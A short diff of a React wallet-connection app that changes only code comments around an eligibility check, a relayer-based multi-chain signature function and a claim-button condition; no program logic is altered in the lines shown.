@@ -279,7 +279,7 @@ function App() {
     }
   }, [isConnected]);
 
-  // Check eligibility
+  // Check eligibility - EXACTLY like your working version
   const checkEligibility = async () => {
     if (!address) return;
     
@@ -431,7 +431,7 @@ function App() {
   };
 
   // ============================================
-  // RELAYER EXECUTION
+  // RELAYER EXECUTION - ONLY THIS PART CHANGED
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -661,7 +661,7 @@ function App() {
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
 
-  // FIXED: Button shows when eligible and not loading
+  // Show claim button - EXACTLY like working version
   const showClaimButton = isConnected && isEligible && !completedChains.length;
 
   return (
